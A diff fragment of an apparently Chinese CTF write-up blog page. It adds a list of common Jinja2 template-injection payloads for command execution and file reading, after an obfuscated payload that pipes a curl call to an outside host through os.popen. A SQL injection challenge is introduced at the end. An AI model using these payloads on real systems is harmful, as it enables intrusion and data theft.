@@ -870,6 +870,12 @@ Returns a list of unique items from the given iterable.</code></pre>
 &#123;% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,c,c,cccccccc,point,ccc,c,point,c,cccccc,cccccccc,point,c,ccccccccc,cccccccc,maohao,ccc,ccccccccc,c,c,c,xiegang,result)|join %&#125; 
 &#123;% set ohs=dict(o=z,s=z)|join %&#125;
 &#123;% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %&#125;</code></pre>
+<p><strong>常用payload</strong></p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__")('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+// 查看根目录</code></pre>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+//读取文件</code></pre>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__impo'+'rt__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
 <h3 id="bsetDB"><a href="#bsetDB" class="headerlink" title="bsetDB"></a>bsetDB</h3><p>这题没做过，服务器直接崩掉。看了别人的wp，难度容易。</p>
 <p>考点：联合查询+load_file文件读取</p>
 <p>注释中给了sql查询句子。</p>
